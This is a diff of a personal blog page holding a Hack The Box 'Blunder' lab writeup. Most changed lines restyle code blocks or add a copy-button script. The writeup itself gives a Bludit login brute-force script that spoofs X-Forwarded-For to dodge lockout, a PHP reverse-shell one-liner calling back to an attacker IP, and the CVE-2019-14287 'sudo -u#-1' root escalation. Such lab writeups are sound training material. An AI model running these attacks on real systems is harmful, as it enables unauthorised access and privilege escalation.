@@ -2,7 +2,7 @@
 <html lang="en">
   <head>
     <title>
-        Hackthebox - Blunder Writeup - A personal cybersecurity blog
+        Hackthebox - Blunder Writeup - fmash16&#39;s blog
       </title>
         <meta charset="utf-8">
     <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
@@ -21,10 +21,10 @@
     
     <meta name="description" content="An easy difficulty linux box" />
     <meta name="generator" content="Hugo 0.71.0 with theme pure" />
-    <title>Hackthebox - Blunder Writeup - A personal cybersecurity blog</title>
+    <title>Hackthebox - Blunder Writeup - fmash16&#39;s blog</title>
     
     
-    <link rel="stylesheet" href="/css/style.min.d25af0bab4d33793898dbd0b3c2137b1b04a01c67b4d3321370361298f0ae3de.css">
+    <link rel="stylesheet" href="/css/style.min.bef22498336108fd63d73af3a80f7d93e90f4ab8174c15d0ce0fe149dcf0312b.css">
     
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.css" async>
     <meta property="og:title" content="Hackthebox - Blunder Writeup" />
@@ -439,14 +439,14 @@ http-title: Blunder | A blunder of interesting facts</p>
 </blockquote>
 <h1 id="enumeration">Enumeration</h1>
 <h2 id="ffuf-fuzzing">ffuf fuzzing</h2>
-<div class="highlight"><pre style="color:#e7e9db;background-color:#2f1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1</span>ffuf -c -w /usr/share/wordlists/dirb/big.txt -u http://10.10.10.191/FUZZ
+<div class="highlight"><pre style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">1</span>ffuf -c -w /usr/share/wordlists/dirb/big.txt -u http://10.10.10.191/FUZZ
 </code></pre></div><p><img src="/img/htb_blunder/2.png" alt=""></p>
 <p>We get a /admin that has the login for the <strong>&ldquo;Bludit cms&rdquo;</strong>
 We also get a /LICENSE. The file shows</p>
 <p><img src="/img/htb_blunder/1.png" alt=""></p>
 <p>Fuzzing for file with .txt extensions, we get something interesting</p>
-<div class="highlight"><pre style="color:#e7e9db;background-color:#2f1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1</span>ffuf -c -w /usr/share/wordlists/dirb/big.txt -u http://10.10.10.191/FUZZ -x
-<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2</span>.txt
+<div class="highlight"><pre style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">1</span>ffuf -c -w /usr/share/wordlists/dirb/big.txt -u http://10.10.10.191/FUZZ -x
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">2</span>.txt
 </code></pre></div><p>We get a possible username <strong>fergus</strong></p>
 <blockquote>
 <p>User: fergus</p>
@@ -462,58 +462,58 @@ We also get a /LICENSE. The file shows</p>
 <h2 id="bruteforce">Bruteforce</h2>
 <p>Got a brute force vulnerability <a href="https://rastating.github.io/bludit-brute-force-mitigation-bypass/">here</a></p>
 <p>Generate a custom wordlist using <strong>cewl</strong></p>
-<div class="highlight"><pre style="color:#e7e9db;background-color:#2f1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1</span>cewl -w passwords.txt -d <span style="color:#f99b15">9</span> -m <span style="color:#f99b15">10</span> blunder.htb
+<div class="highlight"><pre style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">1</span>cewl -w passwords.txt -d <span style="color:#3677a9">9</span> -m <span style="color:#3677a9">10</span> blunder.htb
 </code></pre></div><p>We need to modify the found exploit script as per our needs. The modified
 script is:</p>
-<div class="highlight"><pre style="color:#e7e9db;background-color:#2f1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1</span><span style="color:#776e71">#!/usr/bin/env python3</span>
-<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2</span><span style="color:#5bc4bf">import</span> <span style="color:#fec418">re</span>
-<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3</span><span style="color:#5bc4bf">import</span> <span style="color:#fec418">requests</span>
-<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4</span>
-<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5</span>host <span style="color:#5bc4bf">=</span> <span style="color:#48b685">&#39;http://10.10.10.191&#39;</span>
-<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6</span>login_url <span style="color:#5bc4bf">=</span> host <span style="color:#5bc4bf">+</span> <span style="color:#48b685">&#39;/admin/login&#39;</span>
-<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7</span>username <span style="color:#5bc4bf">=</span> <span style="color:#48b685">&#39;fergus&#39;</span>
-<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8</span>wordlist <span style="color:#5bc4bf">=</span> []
-<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9</span>
-<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10</span><span style="color:#776e71"># Generate 50 incorrect passwords</span>
-<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11</span><span style="color:#815ba4">with</span> open(<span style="color:#48b685">&#34;passwords.txt&#34;</span>, <span style="color:#48b685">&#34;r&#34;</span>) <span style="color:#815ba4">as</span> f:
-<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12</span>    <span style="color:#815ba4">for</span> line <span style="color:#5bc4bf">in</span> f<span style="color:#5bc4bf">.</span>readlines():
-<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13</span>        wordlist<span style="color:#5bc4bf">.</span>append(str(line)<span style="color:#5bc4bf">.</span>strip(<span style="color:#48b685">&#34;</span><span style="color:#f99b15">\n</span><span style="color:#48b685">&#34;</span>))
-<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14</span>
-<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15</span><span style="color:#776e71"># Add the correct password to the end of the list</span>
-<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16</span><span style="color:#776e71">#  wordlist.append(&#39;adminadmin&#39;)</span>
-<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17</span>
-<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18</span><span style="color:#815ba4">for</span> password <span style="color:#5bc4bf">in</span> wordlist:
-<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19</span>    session <span style="color:#5bc4bf">=</span> requests<span style="color:#5bc4bf">.</span>Session()
-<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20</span>    login_page <span style="color:#5bc4bf">=</span> session<span style="color:#5bc4bf">.</span>get(login_url)
-<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21</span>    csrf_token <span style="color:#5bc4bf">=</span> re<span style="color:#5bc4bf">.</span>search(<span style="color:#48b685">&#39;input.+?name=&#34;tokenCSRF&#34;.+?value=&#34;(.+?)&#34;&#39;</span>,
-<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22</span>login_page<span style="color:#5bc4bf">.</span>text)<span style="color:#5bc4bf">.</span>group(<span style="color:#f99b15">1</span>)
-<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23</span>
-<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24</span>    <span style="color:#815ba4">print</span>(<span style="color:#48b685">&#39;[*] Trying: {p}&#39;</span><span style="color:#5bc4bf">.</span>format(p <span style="color:#5bc4bf">=</span> password))
-<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">25</span>
-<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">26</span>    headers <span style="color:#5bc4bf">=</span> {
-<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">27</span>        <span style="color:#48b685">&#39;X-Forwarded-For&#39;</span>: password,
-<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">28</span>        <span style="color:#48b685">&#39;User-Agent&#39;</span>: <span style="color:#48b685">&#39;Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36</span>
-<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">29</span>(KHTML, like Gecko) Chrome<span style="color:#5bc4bf">/</span><span style="color:#f99b15">77.0</span><span style="color:#5bc4bf">.</span><span style="color:#f99b15">3865.90</span> Safari<span style="color:#5bc4bf">/</span><span style="color:#f99b15">537.36</span><span style="color:#48b685">&#39;,</span>
-<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">30</span>        <span style="color:#48b685">&#39;Referer&#39;</span>: login_url
-<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">31</span>    }
-<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">32</span>
-<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">33</span>    data <span style="color:#5bc4bf">=</span> {
-<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">34</span>        <span style="color:#48b685">&#39;tokenCSRF&#39;</span>: csrf_token,
-<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">35</span>        <span style="color:#48b685">&#39;username&#39;</span>: username,
-<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">36</span>        <span style="color:#48b685">&#39;password&#39;</span>: password,
-<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">37</span>        <span style="color:#48b685">&#39;save&#39;</span>: <span style="color:#48b685">&#39;&#39;</span>
-<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">38</span>    }
-<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">39</span>
-<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">40</span>    login_result <span style="color:#5bc4bf">=</span> session<span style="color:#5bc4bf">.</span>post(login_url, headers <span style="color:#5bc4bf">=</span> headers, data <span style="color:#5bc4bf">=</span> data,
-<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">41</span>allow_redirects <span style="color:#5bc4bf">=</span> False)
-<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">42</span>
-<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">43</span>    <span style="color:#815ba4">if</span> <span style="color:#48b685">&#39;location&#39;</span> <span style="color:#5bc4bf">in</span> login_result<span style="color:#5bc4bf">.</span>headers:
-<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">44</span>        <span style="color:#815ba4">if</span> <span style="color:#48b685">&#39;/admin/dashboard&#39;</span> <span style="color:#5bc4bf">in</span> login_result<span style="color:#5bc4bf">.</span>headers[<span style="color:#48b685">&#39;location&#39;</span>]:
-<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">45</span>            <span style="color:#815ba4">print</span>()
-<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">46</span>            <span style="color:#815ba4">print</span>(<span style="color:#48b685">&#39;SUCCESS: Password found!&#39;</span>)
-<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">47</span>            <span style="color:#815ba4">print</span>(<span style="color:#48b685">&#39;Use {u}:{p} to login.&#39;</span><span style="color:#5bc4bf">.</span>format(u <span style="color:#5bc4bf">=</span> username, p <span style="color:#5bc4bf">=</span> password))
-<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">48</span>            <span style="color:#815ba4">print</span>()
-<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">49</span>            <span style="color:#815ba4">break</span>
+<div class="highlight"><pre style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868"> 1</span><span style="color:#999;font-style:italic">#!/usr/bin/env python3</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868"> 2</span><span style="color:#6ab825;font-weight:bold">import</span> <span style="color:#447fcf;text-decoration:underline">re</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868"> 3</span><span style="color:#6ab825;font-weight:bold">import</span> <span style="color:#447fcf;text-decoration:underline">requests</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868"> 4</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868"> 5</span>host = <span style="color:#ed9d13">&#39;http://10.10.10.191&#39;</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868"> 6</span>login_url = host + <span style="color:#ed9d13">&#39;/admin/login&#39;</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868"> 7</span>username = <span style="color:#ed9d13">&#39;fergus&#39;</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868"> 8</span>wordlist = []
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868"> 9</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">10</span><span style="color:#999;font-style:italic"># Generate 50 incorrect passwords</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">11</span><span style="color:#6ab825;font-weight:bold">with</span> <span style="color:#24909d">open</span>(<span style="color:#ed9d13">&#34;passwords.txt&#34;</span>, <span style="color:#ed9d13">&#34;r&#34;</span>) <span style="color:#6ab825;font-weight:bold">as</span> f:
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">12</span>    <span style="color:#6ab825;font-weight:bold">for</span> line <span style="color:#6ab825;font-weight:bold">in</span> f.readlines():
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">13</span>        wordlist.append(<span style="color:#24909d">str</span>(line).strip(<span style="color:#ed9d13">&#34;</span><span style="color:#ed9d13">\n</span><span style="color:#ed9d13">&#34;</span>))
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">14</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">15</span><span style="color:#999;font-style:italic"># Add the correct password to the end of the list</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">16</span><span style="color:#999;font-style:italic">#  wordlist.append(&#39;adminadmin&#39;)</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">17</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">18</span><span style="color:#6ab825;font-weight:bold">for</span> password <span style="color:#6ab825;font-weight:bold">in</span> wordlist:
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">19</span>    session = requests.Session()
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">20</span>    login_page = session.get(login_url)
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">21</span>    csrf_token = re.search(<span style="color:#ed9d13">&#39;input.+?name=&#34;tokenCSRF&#34;.+?value=&#34;(.+?)&#34;&#39;</span>,
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">22</span>login_page.text).group(<span style="color:#3677a9">1</span>)
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">23</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">24</span>    <span style="color:#6ab825;font-weight:bold">print</span>(<span style="color:#ed9d13">&#39;[*] Trying: {p}&#39;</span>.format(p = password))
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">25</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">26</span>    headers = {
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">27</span>        <span style="color:#ed9d13">&#39;X-Forwarded-For&#39;</span>: password,
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">28</span>        <span style="color:#ed9d13">&#39;User-Agent&#39;</span>: <span style="color:#ed9d13">&#39;Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">29</span>(KHTML, like Gecko) Chrome/<span style="color:#3677a9">77.0</span>.<span style="color:#3677a9">3865.90</span> Safari/<span style="color:#3677a9">537.36</span><span style="color:#ed9d13">&#39;,</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">30</span>        <span style="color:#ed9d13">&#39;Referer&#39;</span>: login_url
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">31</span>    }
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">32</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">33</span>    data = {
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">34</span>        <span style="color:#ed9d13">&#39;tokenCSRF&#39;</span>: csrf_token,
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">35</span>        <span style="color:#ed9d13">&#39;username&#39;</span>: username,
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">36</span>        <span style="color:#ed9d13">&#39;password&#39;</span>: password,
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">37</span>        <span style="color:#ed9d13">&#39;save&#39;</span>: <span style="color:#ed9d13">&#39;&#39;</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">38</span>    }
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">39</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">40</span>    login_result = session.post(login_url, headers = headers, data = data,
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">41</span>allow_redirects = False)
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">42</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">43</span>    <span style="color:#6ab825;font-weight:bold">if</span> <span style="color:#ed9d13">&#39;location&#39;</span> <span style="color:#6ab825;font-weight:bold">in</span> login_result.headers:
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">44</span>        <span style="color:#6ab825;font-weight:bold">if</span> <span style="color:#ed9d13">&#39;/admin/dashboard&#39;</span> <span style="color:#6ab825;font-weight:bold">in</span> login_result.headers[<span style="color:#ed9d13">&#39;location&#39;</span>]:
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">45</span>            <span style="color:#6ab825;font-weight:bold">print</span>()
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">46</span>            <span style="color:#6ab825;font-weight:bold">print</span>(<span style="color:#ed9d13">&#39;SUCCESS: Password found!&#39;</span>)
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">47</span>            <span style="color:#6ab825;font-weight:bold">print</span>(<span style="color:#ed9d13">&#39;Use {u}:{p} to login.&#39;</span>.format(u = username, p = password))
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">48</span>            <span style="color:#6ab825;font-weight:bold">print</span>()
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">49</span>            <span style="color:#6ab825;font-weight:bold">break</span>
 </code></pre></div><p>PS: The user we need to brute the password for is <strong>fergus</strong>, not admin. Trying
 with admin, we failed and trying with fergus, we succeed.</p>
 <p>We run the script and get our required password.</p>
@@ -532,11 +532,11 @@ exploit. We get a meterpreter shell back successfully.</p>
 <p><img src="/img/htb_blunder/6.png" alt=""></p>
 <h2 id="www-data-shell">www-data shell</h2>
 <p>We try getting a proper reverse shell from the merterpreter shell</p>
-<div class="highlight"><pre style="color:#e7e9db;background-color:#2f1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1</span>php -r <span style="color:#48b685">&#39;$sock=fsockopen(&#34;10.10.14.55&#34;,8888);exec(&#34;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&#34;);&#39;</span>
+<div class="highlight"><pre style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">1</span>php -r <span style="color:#ed9d13">&#39;$sock=fsockopen(&#34;10.10.14.55&#34;,8888);exec(&#34;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&#34;);&#39;</span>
 </code></pre></div><p>We get a reverse shell back. We stabilize our shell using python.</p>
-<div class="highlight"><pre style="color:#e7e9db;background-color:#2f1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1</span>python3.7 -c <span style="color:#48b685">&#34;import pty;pty.spawn(&#39;/bin/bash&#39;)&#34;</span>
-<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2</span>stty raw -echo
-<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3</span>fg
+<div class="highlight"><pre style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">1</span>python3.7 -c <span style="color:#ed9d13">&#34;import pty;pty.spawn(&#39;/bin/bash&#39;)&#34;</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">2</span>stty raw -echo
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">3</span><span style="color:#24909d">fg</span>
 </code></pre></div><p><img src="/img/htb_blunder/7.png" alt=""></p>
 <h1 id="privilege-escalation---user">Privilege Escalation - User</h1>
 <h2 id="enumeration-1">Enumeration</h2>
@@ -569,14 +569,14 @@ find another user shaun.</p>
 <h2 id="user-shell">User shell</h2>
 <p>We switch to user hugo using su and the password obtained and get the user
 shell.</p>
-<div class="highlight"><pre style="color:#e7e9db;background-color:#2f1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1</span>su - hugo
+<div class="highlight"><pre style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">1</span>su - hugo
 </code></pre></div><p>Now we can read our required user.txt file</p>
 <h1 id="privilege-esccalation---root">Privilege Esccalation - Root</h1>
 <p>Looking for sudo permissions for our user using <code>sudo -l</code>, we find that the
 user hugo can exevute <code>/bin/bash</code> as all users except root (ALL:!root)</p>
 <p>We see that we can execute /bin/bash as any user other than root. This can be
 exploited using a popular sudo vulnerability <a href="https://nvd.nist.gov/vuln/detail/CVE-2019-14287">CVE-2019-14287</a>. Following the exploit, we execute /bin/bash ash sudo and get a root shell</p>
-<div class="highlight"><pre style="color:#e7e9db;background-color:#2f1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1</span>sudo -u#-1 /bin/bash
+<div class="highlight"><pre style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">1</span>sudo -u#-1 /bin/bash
 </code></pre></div><p>Now we can read our required root.txt file from the /root directory.</p>
 
     </div>
@@ -712,6 +712,64 @@ exploited using a popular sudo vulnerability <a href="https://nvd.nist.gov/vuln/
         
         hasInnerContainers: true,
     });
+</script>
+
+
+/* copy code button */
+<script>
+function addCopyButtons(clipboard) {
+    document.querySelectorAll('pre > code').forEach(function (codeBlock) {
+        var button = document.createElement('button');
+        button.className = 'copy-code-button';
+        button.type = 'button';
+        button.innerText = 'Copy';
+
+        button.addEventListener('click', function () {
+              
+            tmp = codeBlock.innerText.split("\n");
+            cutChar = (tmp.length>8) ? 2 : 1;
+            for(i=0; i<tmp.length; i++){
+              tmp[i] = tmp[i].substring(cutChar);
+            }
+            block = tmp.join("\n");
+            clipboard.writeText(block).then(function () {
+                
+
+                button.blur();
+
+                button.innerText = 'Copied!';
+
+                setTimeout(function () {
+                    button.innerText = 'Copy';
+                }, 2000);
+            }, function (error) {
+                button.innerText = 'Error';
+            });
+        });
+
+        var pre = codeBlock.parentNode;
+        if (pre.parentNode.classList.contains('highlight')) {
+            var highlight = pre.parentNode;
+            highlight.parentNode.insertBefore(button, highlight);
+        } else {
+            pre.parentNode.insertBefore(button, pre);
+        }
+    });
+}
+if (navigator && navigator.clipboard) {
+    addCopyButtons(navigator.clipboard);
+} else {
+    var script = document.createElement('script');
+    script.src = 'https://cdnjs.cloudflare.com/ajax/libs/clipboard-polyfill/2.7.0/clipboard-polyfill.promise.js';
+    script.integrity = 'sha256-waClS2re9NUbXRsryKoof+F9qc1gjjIhc2eT7ZbIv94=';
+    script.crossOrigin = 'anonymous';
+    script.onload = function() {
+        addCopyButtons(clipboard);
+    };
+
+    document.body.appendChild(script);
+}
+
 </script>
 
 
